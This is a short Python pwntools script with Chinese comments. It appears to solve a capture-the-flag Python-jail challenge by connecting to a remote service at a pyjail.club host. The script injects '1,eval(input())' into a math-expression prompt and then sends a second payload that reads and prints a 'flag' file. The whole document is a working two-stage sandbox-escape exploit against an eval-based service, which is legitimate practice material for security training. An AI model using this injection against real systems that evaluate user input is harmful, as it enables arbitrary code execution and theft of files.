from pwn import *

# 連接到遠端伺服器
conn = remote('challs1.pyjail.club', 23612)

# 第一階段 Payload: 利用 input() 等待我們的第二次輸入
payload1 = b"1,eval(input())"

# 第二階段 Payload: 在 audit hook 被禁用後執行
payload2 = b"print(open('flag').read())"

# 接收 "Math expression: " 提示
conn.recvuntil(b'Math expression: ')

# 發送第一階段 payload
conn.sendline(payload1)
log.info(f"Sent Stage 1: {payload1.decode()}")

# 伺服器現在正在等待 input()
# 我們直接發送第二階段 payload
conn.sendline(payload2)
log.info(f"Sent Stage 2: {payload2.decode()}")

# 接收所有回傳資料
response = conn.recvall().decode()
print(response)

conn.close()